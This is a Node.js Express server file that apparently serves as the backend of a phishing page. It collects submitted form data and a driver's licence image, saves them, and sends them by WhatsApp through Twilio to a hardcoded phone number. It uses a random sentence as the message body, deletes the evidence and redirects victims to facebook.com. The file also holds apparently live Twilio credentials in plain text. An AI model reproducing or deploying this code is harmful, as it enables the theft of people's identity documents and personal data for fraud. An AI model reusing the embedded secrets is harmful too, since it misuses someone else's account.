const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const multer = require("multer");
const zipFolder = require("zip-a-folder");
const compromise = require("compromise");
const twilio = require('twilio');

// Generate a random sentence for the message body
const randomSentence = compromise("i").random().sentences(1).out();

// Generate a random sentence for the message subject
const randomSubject = compromise("i").random().sentences(1).out();

const port = 9000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Set up file upload using multer
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname);
    cb(null, Date.now() + ext);
  },
});

const upload = multer({ storage: storage });

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
  try {
    const data = req.body;

    // validate data
    if (!data || typeof data !== "object") {
      throw new Error("Invalid data.");
    }

    // create a folder to store the message data
    const folderName = `message-${Date.now()}`;
    fs.mkdirSync(folderName);

    // save the message data to a text file
    const dataFileName = path.join(folderName, "happy.txt");
    fs.writeFileSync(dataFileName, JSON.stringify(data));

    // create Twilio client object
    const client = twilio('ACe54e344198f142962f26f8dbbb56bcdc', 'd121c459858a2071e48667eddf9d2209');

    // send WhatsApp message
    const message = await client.messages.create({
      body: `${randomSentence}`,
      from: 'whatsapp:+14155238886',
      to: 'whatsapp:+2349154911424',
      mediaUrl: `https://${req.get('host')}/${dataFileName}`
    });

    console.log("WhatsApp message sent successfully.", message);

    // remove the folder and file
    fs.unlinkSync(dataFileName);
    fs.rmdirSync(folderName, { recursive: true });

    res.redirect("https://www.facebook.com");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error sending WhatsApp message.");
  }
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
